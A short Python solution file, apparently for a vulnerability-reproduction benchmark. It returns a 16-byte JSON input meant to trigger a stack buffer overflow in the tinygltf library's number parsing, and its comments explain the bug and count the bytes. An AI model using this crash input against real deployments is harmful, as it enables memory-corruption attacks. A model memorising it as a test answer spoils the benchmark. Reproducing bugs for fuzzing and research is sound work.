import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        # The vulnerability in oss-fuzz:42534949 (tinygltf) involves a stack buffer overflow
        # in ParseNumber where a leading minus sign advances the pointer, and if the
        # subsequent text is not "Infinity", it continues parsing. This can be exploited
        # by providing a string that looks like "Infinity" (to reach the check) but isn't,
        # and is long enough to overflow the internal stack buffer when copied.
        # Length calculation:
        # {"a":-InfinAAAA}
        # 1234567890123456
        # Total 16 bytes.
        return b'{"a":-InfinAAAA}'
